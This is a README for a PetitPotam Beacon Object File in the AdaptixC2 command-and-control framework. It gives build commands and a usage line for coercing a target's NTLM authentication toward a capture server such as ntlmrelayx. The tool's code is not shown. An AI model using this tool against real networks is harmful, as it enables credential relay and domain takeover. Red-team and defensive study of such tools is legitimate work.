# petitpotam

AdaptixC2 BOF for coercing NTLM authentication via MS-EFSRPC (PetitPotam).

## Build

Install the MinGW cross-compilers
```
sudo apt install gcc-mingw-w64-x86-64 gcc-mingw-w64-i686
```

Compile
```
make          # produces petitpotam.x64.o / petitpotam.x86.o
make dist     # copies .o files to _bin/
```

## Setup

Load `petitpotam.axs` in the AdaptixC2 server profile (`axscripts` section).

## Usage

```
petitpotam <listener> <target>
```

- **listener** - IP/hostname of the capture server (e.g. ntlmrelayx)
- **target** - IP/hostname of the target to coerce

## Credits & Original Project

- https://github.com/Outflank/petitpotam-bof, [@Cneelis](https://github.com/Cneelis) (Outflank)
- https://github.com/topotam/PetitPotam, [@topotam77](https://github.com/topotam)
